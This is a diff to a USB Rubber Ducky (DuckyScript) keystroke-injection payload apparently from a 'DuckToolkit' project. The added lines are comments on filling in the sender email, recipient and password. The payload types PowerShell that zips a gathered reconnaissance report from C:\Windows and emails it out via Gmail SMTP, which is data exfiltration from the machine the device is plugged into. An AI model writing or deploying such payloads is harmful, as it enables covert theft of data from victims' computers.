@@ -67,14 +67,18 @@ STRING copy-ToZip($fileSaveDir)
 ENTER
 STRING try {
 ENTER
+REM  place an email instead of sender@gmail.com
 STRING $Sender = 'sender@gmail.com'
 ENTER
+REM place a recipient email instead of recipient@gmail.com
 STRING $Recipient = 'recipient@gmail.com'
 ENTER
+REM put the password from the sender email
 STRING $pass = ConvertTo-SecureString 'Password' -AsPlainText -Force
 ENTER
 STRING $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)
 ENTER
+REM don't know if you got to change the smtp.gmail.com to something else.
 STRING Send-MailMessage -From $Sender -To $Recipient -Subject "DuckToolkit Report" -Body "Please find attached the DuckToolkit reconnaissance report." -SmtpServer "smtp.gmail.com" -UseSSL -credential $creds -Attachments "C:\Windows\Report.zip"}
 ENTER
 STRING catch {
